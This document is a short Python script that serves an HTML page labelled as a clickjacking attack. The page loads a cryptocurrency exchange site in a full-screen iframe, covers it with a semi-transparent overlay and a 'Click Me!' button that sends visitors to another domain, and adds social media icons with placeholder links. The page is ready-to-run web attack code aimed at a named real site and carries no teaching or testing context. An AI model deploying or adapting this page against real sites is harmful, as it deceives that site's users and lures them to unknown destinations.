from http.server import BaseHTTPRequestHandler, HTTPServer

# HTML code for the clickjacking page with social media logos
html_code = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clickjacking Attack with Social Media Logos</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5); /* semi-transparent background */
            z-index: 2;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .button-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 3;
        }
        .button-container button {
            padding: 10px 20px;
            font-size: 18px;
            cursor: pointer;
        }
        .social-media-container {
            position: absolute;
            bottom: 10px;
            left: 10px;
            display: flex;
            gap: 10px;
            z-index: 4;
        }
        .social-media-container a {
            display: inline-block;
        }
        .social-media-container img {
            width: 32px;
            height: 32px;
            transition: opacity 0.3s ease;
        }
        .social-media-container img:hover {
            opacity: 0.7;
        }
    </style>
</head>
<body>
    <iframe src="https://jojo.exchange/"></iframe>
    <div class="overlay">
        <div class="button-container">
            <button onclick="redirect()">Click Me!</button>
        </div>
    </div>
    <div class="social-media-container">
        <a href="mailto:your.email@example.com" target="_blank" title="Email">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/30/Email_icon_%282013%29.png/800px-Email_icon_%282013%29.png" alt="Email">
        </a>
        <a href="https://x.com/yourprofile" target="_blank" title="X">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/60/X_logo_%28blue%29.svg/800px-X_logo_%28blue%29.svg.png" alt="X">
        </a>
        <a href="https://warpcast.com/yourprofile" target="_blank" title="Warpcast">
            <img src="https://warpcast.com/favicon.ico" alt="Warpcast">
        </a>
        <a href="https://discord.com/invite/yourserver" target="_blank" title="Discord">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Discord_Logo_Color.svg/1024px-Discord_Logo_Color.svg.png" alt="Discord">
        </a>
        <a href="https://t.me/yourprofile" target="_blank" title="Telegram">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/512px-Telegram_logo.svg.png" alt="Telegram">
        </a>
        <a href="https://medium.com/@yourprofile" target="_blank" title="Medium">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7c/Medium_logo_2013.svg/800px-Medium_logo_2013.svg.png" alt="Medium">
        </a>
        <a href="https://github.com/yourprofile" target="_blank" title="GitHub">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/GitHub_logo_2013.svg/1280px-GitHub_logo_2013.svg.png" alt="GitHub">
        </a>
    </div>
    <script>
        function redirect() {
            window.location.href = 'https://the-mad-hatters-playground.com';
        }
    </script>
</body>
</html>
"""

# HTTP request handler class
class RequestHandler(BaseHTTPRequestHandler):
    # Handle GET requests
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html_code.encode())

# Function to start the server
def start_server():
    server_address = ('0.0.0.0', 8000)
    httpd = HTTPServer(server_address, RequestHandler)
    print('Server started on http://0.0.0.0:8000')
    httpd.serve_forever()

if __name__ == "__main__":
    start_server()
